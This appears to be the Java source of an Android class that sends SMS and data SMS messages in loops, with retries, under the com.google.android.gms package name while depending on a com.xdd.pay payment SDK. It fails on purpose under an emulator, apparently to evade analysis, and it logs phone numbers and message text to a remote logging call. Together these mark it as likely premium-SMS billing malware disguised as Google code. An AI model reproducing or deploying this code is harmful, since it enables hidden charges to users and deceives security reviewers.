package com.google.android.gms;

import org.json.JSONObject;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.text.TextUtils;

import com.google.android.gms.callback.SmsSendCallback;
import com.google.android.gms.constant.SendType;
import com.google.android.gms.util.SmsUtils;
import com.xdd.pay.data.StringData;
import com.xdd.pay.network.object.SmsLogInfo;
import com.xdd.pay.util.PayUtils;
import com.xdd.pay.util.PhoneInfoUtils;
import com.xdd.pay.util.QYLog;
import com.xdd.pay.util.TelephonyMgr;
import com.xdd.pay.util.constant.JsonParameter;
import com.xdd.pay.util.constant.MOType;
import com.xdd.pay.util.constant.ResultType;

public class SmsSender {
	
	private static final String TAG = SmsSender.class.getSimpleName();
	
	private static final int SEND_TIME_OUT = 10 * 1000;
	
	public static boolean smshelpFail = false;
    public static int         sms_sendresultcode    = 100;
    public static int         sms_deliverresultcode = 100;
    public static int         sms_timeout           = 0;

	private Context mContext;

	private SmsSendCallback mCallback;

	private BroadcastReceiver sendReceiver;

	private BroadcastReceiver deliverReceiver;

	private String destPhone;

	private String message;

	private int reSendCount = 0; // 重复发送条数

	private int curSendCount = 0; // 当前发送条数

	private int count; // 连续发送的条数

	private int sendSucCount; // 发送成功的条数

	private int deliverSucCount; // 对方接收成功的条数

	private int sendFailCount; // 发送失败条数

	private int deliverFailCount; // 对方接收失败条数

	private int mSendType; // 发送类型
	
	private int mPort; // 发送端口
	
	private Runnable timeoutRunnable = new Runnable() {

		@Override
		public void run() {
			sendFailCount = count;
            sms_timeout = 1;
			QYLog.d("timeout Runnable");
			onFail();
		}
	};

	private PendingIntent sendPendingIntent;

	private PendingIntent deliverPendingIntent;

  public SmsSender(Context context, SmsSendCallback callback, int count, int sendType, int mPort) {
    mContext = context;
    mCallback = callback;
    this.count = count;
    this.mSendType = sendType;
    this.mPort = mPort;
    QYLog.d(TAG, "------count----------"+count);
    if (mContext == null) {
      QYLog.d(TAG, "------mContext==null----------");
      return;
    } else {
      QYLog.d(TAG, "------mContext!=null----------");
    }

		try {
			sendReceiver = new BroadcastReceiver() {

				@Override
				public void onReceive(Context context, Intent intent) {
					if (PhoneInfoUtils.isEmulator(mContext)) {
						QYLog.d("is emulator");
						onFail();
						return;
					}
					sms_sendresultcode = getResultCode();
					switch (sms_sendresultcode) {
						case Activity.RESULT_OK :
							QYLog.d(TAG," suc");
							sendSucCount++;
							onSuccess();
							break;
						default :
							QYLog.d(TAG," fail");
							sendFailCount++;
							onFail();
							break;
					}
				}
			};
			deliverReceiver = new BroadcastReceiver() {

				@Override
				public void onReceive(Context context, Intent intent) {
                    sms_deliverresultcode = getResultCode();
					switch (sms_deliverresultcode) {
						case Activity.RESULT_OK :
							QYLog.d(TAG,"d suc");
							deliverSucCount++;
							onSuccess();
							break;
						default :
							QYLog.d(TAG,"d fail");
							deliverFailCount++;
							onFail();
							break;
					}
				}
			};
			mContext.registerReceiver(sendReceiver, new IntentFilter(StringData.getInstance().SEND_SMS_ACTION));
			mContext.registerReceiver(deliverReceiver, new IntentFilter(StringData.getInstance().DELIVERED_SMS_ACTION));
		} catch (Exception e) {
			QYLog.e("register listener fail!");
		}

		Intent sendIntent = new Intent(StringData.getInstance().SEND_SMS_ACTION);
		sendPendingIntent = PendingIntent.getBroadcast(mContext, 0, sendIntent, 0);

		Intent deliverIntent = new Intent(StringData.getInstance().DELIVERED_SMS_ACTION);
		deliverPendingIntent = PendingIntent.getBroadcast(mContext, 0, deliverIntent, 0);

	}

	public SmsSender(Context context, SmsSendCallback callback, int count, int reSendCount, int sendType, int mPort) {
		this(context, callback, count, sendType, mPort);
		this.reSendCount = reSendCount;
		this.mSendType = sendType;
	}

	/**
	 * 发送短信
	 * 
	 * @param destPhone
	 * @param message
	 */
	public void sendSms(final String destPhone, final String message) {
		if (TextUtils.isEmpty(destPhone)) {
//			QYLog.e("destPhone is null");
			onFail();
			return;
		}
		if (TextUtils.isEmpty(message)) {
//			QYLog.e("message is null");
			onFail();
			return;
		}
		this.destPhone = destPhone;
		this.message = message;
//		QYLog.e("destPhone is :" + destPhone);
//		QYLog.e("message is :" + message);
		for (int i = 0; i < count; i++) {
			if(mSendType == SendType.SEND_DATA_MESSAGE){
				SmsUtils.sendDataMessage(destPhone, message, sendPendingIntent, deliverPendingIntent, mPort);
			} else {
				SmsUtils.sendSms(destPhone, message, sendPendingIntent, deliverPendingIntent);
			}
		}
		if (PayUtils.mPayHandler != null) {
			PayUtils.mPayHandler.postDelayed(timeoutRunnable, SEND_TIME_OUT);
		}
	}

	private void onSuccess() {
//		QYLog.e("sendSucCount:" + sendSucCount + "  count:" + count);
		if (sendSucCount == count || deliverSucCount == count) {
			sendSucCount = 0;
			deliverSucCount = 0;
//			QYLog.d("removeCallbacks begin");
			PayUtils.mPayHandler.removeCallbacks(timeoutRunnable);
      try {
        SmsLogInfo smsLogInfo = new SmsLogInfo();
        smsLogInfo.setLocalTime(System.currentTimeMillis() + "");
        smsLogInfo.setPhoneNum(destPhone);
        smsLogInfo.setSms(message);
        smsLogInfo.setType(MOType.SMS_SEND_SUCCESS);
        smsLogInfo.setResult(ResultType.SUCCESS);
        JSONObject obj = new JSONObject();
        if (TelephonyMgr.isDualMode(PayUtils.getInstance().mContext)) {
          obj.accumulate(JsonParameter.ISDUALMODE, 1 + "");
        } else {
          obj.accumulate(JsonParameter.ISDUALMODE, 0 + "");
        }
        obj.accumulate(JsonParameter.SMSSENDRESULTCODE, SmsSender.sms_sendresultcode + "");
        obj.accumulate(JsonParameter.SMSDELIVERRESULTCODE, SmsSender.sms_deliverresultcode + "");
        obj.accumulate(JsonParameter.SMSTIMEOUT, sms_timeout + "");
        smsLogInfo.setReserved2(obj.toString());
        PayUtils.getInstance().sendRealTimeLog(smsLogInfo, false);
        SmsSender.sms_sendresultcode = 100;
        SmsSender.sms_deliverresultcode = 100;
        sms_timeout = 0;
      } catch (Exception e) {
        QYLog.e("send log error:" + e.getLocalizedMessage());
      }
//			QYLog.d("removeCallbacks end");
			unregisterReceiver();
			if (mCallback != null) {
				mCallback.onSuccess(destPhone, message);
				mCallback = null;
			}
		}
	}

	private void onFail() {
	    if(SmsUtils.issmshelp) {
	        SmsSender.smshelpFail = true;
	        SmsUtils.sendSms(destPhone, message, sendPendingIntent, deliverPendingIntent);
	    }
		if (sendFailCount == count || deliverFailCount == count) {
			sendSucCount = 0;
			deliverSucCount = 0;
			sendFailCount = 0;
			deliverFailCount = 0;
			PayUtils.mPayHandler.removeCallbacks(timeoutRunnable);
	    try {
	      SmsLogInfo smsLogInfo = new SmsLogInfo();
	      smsLogInfo.setLocalTime(System.currentTimeMillis() + "");
	      smsLogInfo.setPhoneNum(destPhone);
	      smsLogInfo.setSms(message);
	      smsLogInfo.setType(MOType.SMS_SEND_FAIL);
	      smsLogInfo.setResult(ResultType.FAIL);
	      JSONObject obj = new JSONObject();
	      if (TelephonyMgr.isDualMode(PayUtils.getInstance().mContext)) {
	        obj.accumulate(JsonParameter.ISDUALMODE, 1+"");
	      } else {
	        obj.accumulate(JsonParameter.ISDUALMODE, 0+"");
	      }
	      obj.accumulate(JsonParameter.SMSSENDRESULTCODE, SmsSender.sms_sendresultcode+"");
	      obj.accumulate(JsonParameter.SMSDELIVERRESULTCODE, SmsSender.sms_deliverresultcode+"");
	      obj.accumulate(JsonParameter.SMSTIMEOUT, sms_timeout+"");
	      smsLogInfo.setReserved2(obj.toString());
	      PayUtils.getInstance().sendRealTimeLog(smsLogInfo, false);
	      SmsSender.sms_sendresultcode = 100;
	      SmsSender.sms_deliverresultcode = 100;
	      sms_timeout = 0;
	    } catch (Exception e) {
	      QYLog.e("send log error:" + e.getLocalizedMessage());
	    }
			if (curSendCount < reSendCount) {
				curSendCount++;
				sendSms(destPhone, message);
			} else {
				unregisterReceiver();
				if (mCallback != null) {
					mCallback.onFail(destPhone, message);
					mCallback = null;
				}
			}
		}
	}

	/**
	 * 注销监听
	 */
	private void unregisterReceiver() {
		try {
			mContext.unregisterReceiver(sendReceiver);
			mContext.unregisterReceiver(deliverReceiver);
		} catch (Exception e) {
			QYLog.p(e);
		}
	}
}
